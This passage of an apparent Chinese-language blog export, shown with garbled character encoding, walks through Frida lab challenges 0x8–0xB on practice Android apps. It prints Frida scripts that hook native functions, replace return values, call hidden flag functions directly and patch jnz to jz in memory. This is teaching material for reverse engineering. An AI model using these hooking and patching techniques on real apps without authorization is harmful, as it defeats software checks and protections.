class="comment">// console.log(&quot;args0:&quot;, arg0);</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args0:&quot;</span>, arg1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>frida æ‰§è¡Œä¹‹åéœ€è¦åœ¨ app è¾“å…¥æ¡†ä¸­è¾“å…¥åŒ…å« tttt çš„æ–‡æœ¬</p><p>ç„¶åç‚¹å‡»æäº¤ï¼Œè¿™æ · s2 åŒ…å«çš„ flag å°±ä¼šæ‰“å°åœ¨ç»ˆç«¯ä¹‹ä¸­</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x8/08-2.png" alt="image-20250302143829271"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x8/08-3.png" alt="image-20250302143815191"></p><hr><h2 id="frida-0x9"><a href="#frida-0x9" class="headerlink" title="frida_0x9"></a>frida_0x9</h2><p>å’Œ 0x8 ä¸€æ ·ä¹Ÿæ˜¯è¦ hook native å±‚çš„å‡½æ•°ï¼Œ</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜çš„ hook ç‚¹æ˜¯åœ¨å‡½æ•°æ‰§è¡Œå</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x9/09.png" alt="image-20250303192558431"></p><p>æŸ¥çœ‹.so ä¸­çš„å‡½æ•°å‘ç°åªæ˜¯çš„é‚£ä¼šä¸€ä¸ª 1</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x9/09-1.png" alt="image-20250303193951284"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦ä½¿å¾—å‡½æ•°ç»“æŸåè¿”å› 1337 å°±å¯ä»¥äº†</p><h3 id="expï¼š-5"><a href="#expï¼š-5" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> imp = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;liba0x9.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¯¼å…¥è¡¨ï¼š\n&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> expr = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;liba0x9.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¯¼å‡ºè¡¨ï¼š\n&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(expr, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> check_1flag_add = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(</span><br><span class="line">      <span class="string">&quot;liba0x9.so&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_1flag_addr:&quot;</span>, check_1flag_add);</span><br><span class="line">    <span class="comment">// var out_put;</span></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(check_1flag_add, &#123;</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;&#125;,</span><br><span class="line">      <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">//è§¦å‘æ—¶æœºåœ¨ç›®æ ‡å‡½æ•°è¿”å›åï¼Œç”¨äºè·å–/ä¿®æ”¹è¿”å›å€¼</span></span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1337</span>); <span class="comment">//ä¿®æ”¹è¿”å›å€¼ä¸º1337</span></span><br><span class="line">        <span class="comment">// console.log(&quot;retval&quot;,retval.toInt32());æ˜¾ç¤ºè¿”å›å€¼</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="frida-0xA"><a href="#frida-0xA" class="headerlink" title="frida_0xA"></a>frida_0xA</h2><p>è¿™ä¸€å…³ä¹Ÿæ˜¯ hook ä¸€ä¸ªé™æ€æ³¨å†Œçš„ native å±‚</p><p>ä½†æ˜¯å’Œä¸Šä¸€å…³ä¸ä¸€æ ·çš„æ˜¯è¿™å…³çš„è·å¾— flag çš„å‡½æ•°æ²¡æœ‰è¢« java å±‚çš„ MainActivity è°ƒç”¨</p><p>éœ€è¦åœ¨ frida ä¹‹ä¸­è¿›è¡Œ native å±‚çš„å£°æ˜å®ä¾‹åŒ–ã€‚</p><p>æˆ‘ä»¬å‘ç°äº†å£°æ˜äº† native å±‚çš„ stringFromJNI æ–¹æ³•</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa.png" alt="image-20250304200942788"></p><p>æŸ¥çœ‹ native å±‚çš„ stringFromJNI å‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-1.png" alt="image-20250304201657728"></p><p>æ²¡å•¥æœ‰ç”¨çš„ï¼Œçœ‹ä¸‹å‡½æ•°å¯¼å‡ºè¡¨ï¼Œæœäº†ä¸€ä¸‹ flag,å‘ç°ä¸€ä¸ª get_flag çš„å‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-2.png" alt="image-20250304202902519"></p><p>è·Ÿè¿›æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ª flag çš„è‡ªè§£å¯†ç¨‹åº</p><p>æœ€ååœ¨æ—¥å¿—ä¸­è¿›è¡Œæ‰“å°ï¼ˆ__android_log_printï¼‰</p><p>è¿™é‡Œè¦å…ˆçŸ¥é“ä¸€ä¸‹__android_log_print è¿™ä¸ªå‡½æ•°ï¼Œ</p><p>å®ƒæ˜¯ Android NDK æä¾›çš„æ—¥å¿—å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼ <code>printf</code>ï¼Œä½†è¾“å‡ºåˆ° <code>adb logcat</code>ã€‚</p><p>ida ä¸­è¿™å¥å…·ä½“å‡½æ•°ä¸­çš„å„å‚æ•°çš„æ„æ€æ˜¯</p><p><code>3LL</code> â†’ **æ—¥å¿—çº§åˆ« <code>ANDROID_LOG_DEBUG</code>**ï¼ˆç­‰åŒäº <code>ANDROID_LOG_DEBUG = 3</code>ï¼‰ã€‚</p><p><code>&quot;FLAG&quot;</code> â†’ <strong>æ—¥å¿— Tag</strong>ï¼Œç”¨äº <code>logcat</code> è¿‡æ»¤æ—¥å¿—ã€‚</p><p><code>&quot;Decrypted Flag: %s&quot;</code> â†’ <strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>ï¼Œè¾“å‡º <code>&quot;Decrypted Flag: v4&quot;</code>ã€‚</p><p><code>v4</code> â†’ <strong>è¦æ‰“å°çš„å­—ç¬¦ä¸²</strong>ï¼ˆ<code>char*</code> ç±»å‹ï¼‰ã€‚</p><p>æ‰€ä»¥åœ¨ hook å®Œè¿™ä¸ªå‡½æ•°ä¹‹åè¦åœ¨æ—¥å¿—ä¸­è¿‡æ»¤æŸ¥æ‰¾ flag</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-3.png" alt="image-20250304203021266"></p><p>ä½†æ˜¯ç›´æ¥æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°åçš„åœ°å€æ—¶ä¼šå‘ç°æ‰¾ä¸åˆ°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-4.png" alt="image-20250304203606779"></p><p>å›åˆ° ida çš„æ±‡ç¼–ç•Œé¢æ‰å‘ç°è¿™ä¸ªå‡½æ•°çš„åå­—ä¸æ˜¯ get_flag</p><p>è€Œæ˜¯_Z8get_flagii</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-6.png" alt="image-20250304203723164"></p><p>è¿™æ ·å°±èƒ½æ‰¾åˆ° get_flag çš„åœ°å€äº†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-7.png" alt="image-20250304203824647"></p><p>ç„¶åéœ€è¦è¿›è¡Œå®ä¾‹åŒ–è°ƒç”¨ï¼Œä¹‹åè¿›è¡Œ hookï¼Œæœ€ååœ¨æ—¥å¿—ä¸­æŸ¥æ‰¾</p><h3 id="expï¼š-6"><a href="#expï¼š-6" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> get_flag_add = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(</span><br><span class="line">      <span class="string">&quot;libfrida0xa.so&quot;</span>,</span><br><span class="line">      <span class="string">&quot;_Z8get_flagii&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag_add_addr:&quot;</span>, get_flag_add);</span><br><span class="line">    <span class="comment">//åˆ›å»ºNativePointerå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(get_flag_add);</span><br><span class="line">    <span class="comment">//åˆ›å»ºNativeFunctionå¯¹è±¡ï¼Œå‚æ•°ä¸ºNativePointerå¯¹è±¡ï¼Œè¿”å›ç±»å‹ï¼ŒåŸå‡½æ•°å‚æ•°</span></span><br><span class="line">    <span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&quot;void&quot;</span>, [<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>]); <span class="comment">//</span></span><br><span class="line">    <span class="title function_">get_flag</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get_flag</span>(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xA/0xa-8.png" alt="image-20250304205528101"></p><hr><h2 id="frida-0xB"><a href="#frida-0xB" class="headerlink" title="frida_0xB"></a>frida_0xB</h2><p><code>hook</code>é™æ€çš„<code>so</code>å±‚ï¼Œä½†æ˜¯éœ€è¦ç”¨<code>Frida</code>çš„ç¡¬ç¼–ç å·¥å…·ä¿®æ”¹ç¡¬ç¼–ç </p><p>æŸ¥çœ‹<code>java</code>å±‚ä¸»ç±»ï¼Œå‘ç°è°ƒç”¨äº†<code>so</code>å±‚çš„<code>getflag</code>å‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xB/0xb.png" alt="image-20250317174821063"></p><p>æŸ¥çœ‹<code>so</code>å±‚çš„<code>getflag</code>å‡½æ•°ï¼Œå‘ç°å¹¶ä¸èƒ½æ­£å¸¸åç¼–è¯‘</p><p>åŸæ¥æ˜¯ rax è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œä½†æ˜¯èµ‹å€¼å’Œæ¯”è¾ƒå€¼ä¸ä¸€æ ·æ‰€ä»¥ä¸”æ’ä¸º 0ï¼Œæ‰€ä»¥ ida ä¼šè‡ªåŠ¨ä¸ç¼–è¯‘</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xB/0xb-1.png" alt="image-20250317175401133"></p><p>æŠŠ jnz æ”¹æˆ jz ä¹‹åå°±å¯ä»¥æ­£å¸¸æŸ¥çœ‹ä¼ªä»£ç äº†ï¼Œ</p><p>ä¼ªä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•å¼‚æˆ–</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xB/0xb-2.png" alt="image-20250317175542094"></p><p>ç»¼ä¸Šè¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•</p><h3 id="æ–¹æ³•ä¸€ï¼šä¿®æ”¹ç¡¬ç¼–ç ï¼Œhookæ”¹jnzä¸ºjz"><a href="#æ–¹æ³•ä¸€ï¼šä¿®æ”¹ç¡¬ç¼–ç ï¼Œhookæ”¹jnzä¸ºjz" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä¿®æ”¹ç¡¬ç¼–ç ï¼Œhookæ”¹jnzä¸ºjz"></a>æ–¹æ³•ä¸€ï¼šä¿®æ”¹ç¡¬ç¼–ç ï¼Œ<code>hook</code>æ”¹<code>jnz</code>ä¸º<code>jz</code></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>); <span class="comment">//libcåŸºåœ°å€</span></span><br><span class="line">    <span class="keyword">var</span> jnz = libc_base.<span class="title function_">add</span>(<span class="number">0x170ce</span>); <span class="comment">//JNZæ‰€åœ¨åç§»</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base : &quot;</span>, libc_base);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jnz : &quot;</span>, jnz);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(jnz, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>); <span class="comment">//èµ‹äºˆrwxæƒé™</span></span><br><span class="line">    <span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–å†…å­˜èŒƒå›´å†…çš„æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">var</span> size = <span class="number">0x30</span>; <span class="comment">// è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">var</span> instructionBytes = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(jnz, size);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instructionBytes ï¼š\n&quot;</span>, instructionBytes);</span><br><span class="line">    <span class="comment">// è§£æå¹¶è¾“å‡ºæ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">var</span> instructions = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(jnz, instructionBytes);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instructions ï¼š&quot;</span>, instructions);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      writer.<span class="title function_">putBytes</span>([<span class="number">0x0f</span>, <span class="number">0x84</span>]); <span class="comment">//æ›¿æ¢ä¸ºJzï¼Œ0x0Aä¸ºæ¡ä»¶ä¸æ»¡è¶³åˆ™è·³è½¬</span></span><br><span class="line">      writer.<span class="title function_">flush</span>(); <span class="comment">// åˆ·æ–°æŒ‡ä»¤ç¼“å­˜</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      writer.<span class="title function_">dispose</span>(); <span class="comment">// é‡Šæ”¾writerå¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> instructionBytes = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(jnz, size);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;new instructionBytes ï¼š\n&quot;</span>, instructionBytes);</span><br><span class="line">    <span class="comment">//è§£æå¹¶è¾“å‡ºæ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">var</span> instructions = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(jnz, instructionBytes);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;new instructions ï¼š&quot;</span>, instructions);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒï¼šä¿®æ”¹ä¸Šé¢çš„æ¯”è¾ƒï¼ŒæŠŠé•¿çš„æ•°å­—æ”¹æˆçŸ­çš„ï¼Œä½¿å¾—æ¯”è¾ƒç»“æœæ’ä¸º-1"><a href="#æ–¹æ³•äºŒï¼šä¿®æ”¹ä¸Šé¢çš„æ¯”è¾ƒï¼ŒæŠŠé•¿çš„æ•°å­—æ”¹æˆçŸ­çš„ï¼Œä½¿å¾—æ¯”è¾ƒç»“æœæ’ä¸º-1" class="headerlink" title="æ–¹æ³•äºŒï¼šä¿®æ”¹ä¸Šé¢çš„æ¯”è¾ƒï¼ŒæŠŠé•¿çš„æ•°å­—æ”¹æˆçŸ­çš„ï¼Œä½¿å¾—æ¯”è¾ƒç»“æœæ’ä¸º 1"></a>æ–¹æ³•äºŒï¼šä¿®æ”¹ä¸Šé¢çš„æ¯”è¾ƒï¼ŒæŠŠé•¿çš„æ•°å­—æ”¹æˆçŸ­çš„ï¼Œä½¿å¾—æ¯”è¾ƒç»“æœæ’ä¸º 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>); <span class="comment">//libcåŸºåœ°å€</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">DEADBEEF</span> = libc_base.<span class="title function_">add</span>(<span class="number">0x170c0</span>); <span class="comment">//0xDEADBEEFæ‰€åœ¨åç§»</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base : &quot;</span>, libc_base);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;DEADBEEF : &quot;</span>, <span class="variable constant_">DEADBEEF</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="variable constant_">DEADBEEF</span>, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>); <span class="comment">//èµ‹äºˆrwxæƒé™</span></span><br><span class="line">  <span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(<span class="variable constant_">DEADBEEF</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è¯»å–å†…å­˜èŒƒå›´å†…çš„æŒ‡ä»¤</span></span><br><span class="line">  <span class="keyword">var</span> size = <span class="number">0x30</span>; <span class="comment">// è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line">  <span class="keyword">var</span> instructionBytes = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(<span class="variable constant_">DEADBEEF</span>, size);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instructionBytes ï¼š&quot;</span>, instructionBytes);</span><br><span class="line">  <span class="comment">// è§£æå¹¶è¾“å‡ºæ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">  <span class="keyword">var</span> instructions = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(<span class="variable constant_">DEADBEEF</span>, instructionBytes);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instructions ï¼š&quot;</span>, instructions);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    writer.<span class="title function_">putBytes</span>([<span class="number">0xc7</span>, <span class="number">0x45</span>, <span class="number">0xdc</span>, <span class="number">0x39</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]); <span class="comment">//ä¿®æ”¹ä¸º0x539</span></span><br><span class="line">    writer.<span class="title function_">flush</span>();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    writer.<span class="title function_">dispose</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> instructionBytes = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(<span class="variable constant_">DEADBEEF</span>, size);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;new instructionBytes ï¼š&quot;</span>, instructionBytes);</span><br><span class="line">  <span class="comment">// è§£æå¹¶è¾“å‡ºæ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">  <span class="keyword">var</span> instructions = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(<span class="variable constant_">DEADBEEF</span>, instructionBytes);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;new instructions ï¼š&quot;</span>, instructions);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="expï¼š-7"><a href="#expï¼š-7" class="headerlink" title="expï¼š"></a>expï¼š</h3><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0xB/0xb-3.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰å“é€†å‘(ä¸€)</title>
      <link href="/2024/10/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
      <url>/2024/10/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="å®‰å“é€†å‘"><a href="#å®‰å“é€†å‘" class="headerlink" title="å®‰å“é€†å‘"></a>å®‰å“é€†å‘</h1><h2 id="ä¸€ã€é™æ€åˆè¯†"><a href="#ä¸€ã€é™æ€åˆè¯†" class="headerlink" title="ä¸€ã€é™æ€åˆè¯†"></a>ä¸€ã€é™æ€åˆè¯†</h2><h3 id="1-ç¯å¢ƒå®‰è£…ï¼Œç›´æ¥çœ‹æ­£å·±å¸ˆå‚…çš„52æ•™ç¨‹å°±è¡Œï¼Œé¢å…·éƒ¨åˆ†éœ€è¦Kitsune-Mask"><a href="#1-ç¯å¢ƒå®‰è£…ï¼Œç›´æ¥çœ‹æ­£å·±å¸ˆå‚…çš„52æ•™ç¨‹å°±è¡Œï¼Œé¢å…·éƒ¨åˆ†éœ€è¦Kitsune-Mask" class="headerlink" title="1.ç¯å¢ƒå®‰è£…ï¼Œç›´æ¥çœ‹æ­£å·±å¸ˆå‚…çš„52æ•™ç¨‹å°±è¡Œï¼Œé¢å…·éƒ¨åˆ†éœ€è¦Kitsune Mask"></a>1.ç¯å¢ƒå®‰è£…ï¼Œç›´æ¥çœ‹æ­£å·±å¸ˆå‚…çš„52æ•™ç¨‹å°±è¡Œï¼Œé¢å…·éƒ¨åˆ†éœ€è¦Kitsune Mask</h3><p>â€‹<a href="https://www.52pojie.cn/thread-1695141-1-1.html">ç›´é€šé“¾æ¥</a></p><hr><hr><h3 id="2-è®¤è¯†Apkç»“æ„ã€åŒå¼€ã€æ±‰åŒ–å’ŒåŸºç¡€ä¿®æ”¹"><a href="#2-è®¤è¯†Apkç»“æ„ã€åŒå¼€ã€æ±‰åŒ–å’ŒåŸºç¡€ä¿®æ”¹" class="headerlink" title="2.è®¤è¯†Apkç»“æ„ã€åŒå¼€ã€æ±‰åŒ–å’ŒåŸºç¡€ä¿®æ”¹"></a>2.è®¤è¯†Apkç»“æ„ã€åŒå¼€ã€æ±‰åŒ–å’ŒåŸºç¡€ä¿®æ”¹</h3><p>ç”±äºè¿™ä¸ªæ•™ç¨‹æ˜¯22å¹´å‡ºçš„ï¼Œnpç®¡ç†å™¨æ²¡æœ‰ç°åœ¨å¥½ç”¨ï¼Œæ‰€ä»¥æ­£å·±å¸ˆå‚…ç”¨çš„mtå’Œnpç®¡ç†å™¨ä¸€èµ·ç”¨çš„ã€‚</p><p>ç°åœ¨npç®¡ç†å™¨åŠŸèƒ½å’ŒmtåŸºæœ¬æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œæ‰€ä»¥ç”¨mtçš„éƒ¨åˆ†ç›´æ¥ç”¨npç®¡ç†å™¨å°±è¡Œã€‚</p><h4 id="Apkç»“æ„"><a href="#Apkç»“æ„" class="headerlink" 